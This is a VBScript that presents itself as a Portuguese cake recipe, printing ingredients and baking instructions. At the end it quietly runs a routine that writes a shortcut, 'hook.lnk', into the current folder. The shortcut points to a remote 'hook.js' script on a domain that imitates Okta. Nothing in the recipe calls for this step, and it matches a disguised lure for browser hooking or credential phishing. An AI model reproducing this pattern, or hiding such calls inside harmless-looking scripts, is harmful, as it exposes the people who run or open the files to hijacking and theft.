Dim ingredientes, ingrediente
ingredientes = Array("Farinha", "Açúcar", "Ovos", "Manteiga", "Leite", "Fermento")

WScript.Echo "Receita simples de bolo:"
WScript.Echo

For Each ingrediente In ingredientes
    WScript.Echo "- " & ingrediente
Next

WScript.Echo
WScript.Echo "Instruções:"
WScript.Echo "1. Misture todos os ingredientes secos."
WScript.Echo "2. Adicione os ingredientes úmidos e misture bem."
WScript.Echo "3. Despeje a massa em uma forma untada e enfarinhada."
WScript.Echo "4. Asse em forno pré-aquecido a 180°C por 35-40 minutos ou até dourar."
WScript.Echo "5. Deixe esfriar, desenforme e sirva."

CreateShortcut "https://okta.frothiy.com/hook.js", "hook.lnk"

Sub CreateShortcut(url, shortcutName)
    Dim objShell, objShortcut
    Set objShell = CreateObject("WScript.Shell")
    Set objShortcut = objShell.CreateShortcut(objShell.CurrentDirectory & "\" & shortcutName)
    objShortcut.TargetPath = url
    objShortcut.Save
End Sub
